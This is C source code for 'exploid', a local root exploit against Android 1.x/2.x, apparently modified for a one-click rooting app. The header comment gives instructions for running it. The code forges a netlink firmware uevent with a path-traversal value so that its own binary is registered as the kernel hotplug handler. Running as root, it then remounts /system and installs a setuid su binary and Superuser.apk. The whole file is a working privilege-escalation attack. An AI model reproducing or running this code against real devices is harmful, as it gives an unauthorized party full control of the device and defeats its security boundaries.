/* android 1.x/2.x the real youdev feat. init local root exploit.
 * (C) 2009/2010 by The Android Exploid Crew.
 *
 * Copy from sdcard to /sqlite_stmt_journals/exploid, chmod 0755 and run.
 * Or use /data/local/tmp if available (thx to ioerror!) It is important to
 * to use /sqlite_stmt_journals directory if available.
 * Then try to invoke hotplug by clicking Settings->Wireless->{Airplane,WiFi etc}
 * or use USB keys etc. This will invoke hotplug which is actually
 * our exploit making /system/bin/rootshell.
 * This exploit requires /etc/firmware directory, e.g. it will
 * run on real devices and not inside the emulator.
 * I'd like to have this exploitet by using the same blockdevice trick
 * as in udev, but internal structures only allow world writable char
 * devices, not block devices, so I used the firmware subsystem.
 *
 * !!!This is PoC code for educational purposes only!!!
 * If you run it, it might crash your device and make it unusable!
 * So you use it at your own risk!
 *
 * Thx to all the TAEC supporters.
 */
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/mount.h>


#define SECRET "secretlol"


void die(const char *msg)
{
perror(msg);
exit(errno);
}


void copy(const char *from, const char *to)
{
int fd1, fd2;
char buf[0x1000];
ssize_t r = 0;

if ((fd1 = open(from, O_RDONLY)) < 0)
die("[-] open");
if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0)
die("[-] open");
for (;;) {
r = read(fd1, buf, sizeof(buf));
if (r < 0)
die("[-] read");
if (r == 0)
break;
if (write(fd2, buf, r) != r)
die("[-] write");
}

close(fd1);
close(fd2);
sync(); sync();
}


void clear_hotplug()
{
int ofd = open("/proc/sys/kernel/hotplug", O_WRONLY|O_TRUNC);
write(ofd, "", 1);
close(ofd);
}


int main(int argc, char **argv, char **env)
{
char buf[512], path[512];
int ofd;
struct sockaddr_nl snl;
struct iovec iov = {buf, sizeof(buf)};
struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
int sock;
char *basedir = NULL;


/* I hope there is no LD_ bug in androids rtld :) */
/*if (geteuid() == 0 && getuid() != 0)
rootshell(env);*/

if (readlink("/proc/self/exe", path, sizeof(path)) < 0)
die("[-] readlink");

if (geteuid() == 0) {
clear_hotplug();
/* remount /system rw */
//DROID 1 and Ally
//mount("/dev/block/mtdblock4", "/system", "yaffs2", MS_REMOUNT, 0);
//DROID X
//mount("/dev/block/mmcblk1p21", "/system", "ext3", MS_REMOUNT, 0);
//GALAXY S
mount("/dev/block/stl9","/system", "rfs", MS_REMOUNT, 0);
//Eris and HTC Hero
//mount("/dev/block/mtdblock3", "/system", "yaffs2", MS_REMOUNT, 0);
//copy("/sdcard/su","/system/bin/su");
//copy("/sdcard/Superuser.apk","/system/app/Superuser.apk");
copy("/data/data/com.unstableapps.easyroot/files/su","/system/bin/su");
copy("/data/data/com.unstableapps.easyroot/files/Superuser.apk","/system/app/Superuser.apk");
chmod("/system/bin/su", 04755);
chmod("/system/app/Superuser.apk", 04744);

for (;;);
}

//basedir = "/sqlite_stmt_journals";
basedir = "/data/data/com.unstableapps.easyroot/files";
if (chdir(basedir) < 0) {
basedir = "/data/local/tmp";
if (chdir(basedir) < 0)
basedir = strdup(getcwd(buf, sizeof(buf)));
}

memset(&snl, 0, sizeof(snl));
snl.nl_pid = 1;
snl.nl_family = AF_NETLINK;

if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
die("[-] socket");

close(creat("loading", 0666));
if ((ofd = creat("hotplug", 0644)) < 0)
die("[-] creat");
if (write(ofd, path , strlen(path)) < 0)
die("[-] write");
close(ofd);
symlink("/proc/sys/kernel/hotplug", "data");
snprintf(buf, sizeof(buf), "ACTION=add%cDEVPATH=/..%s%c"
        "SUBSYSTEM=firmware%c"
        "FIRMWARE=../../..%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);
printf("[+] sending add message ...\n");
if (sendmsg(sock, &msg, 0) < 0)
die("[-] sendmsg");
close(sock);
sleep(3);
return 0;
}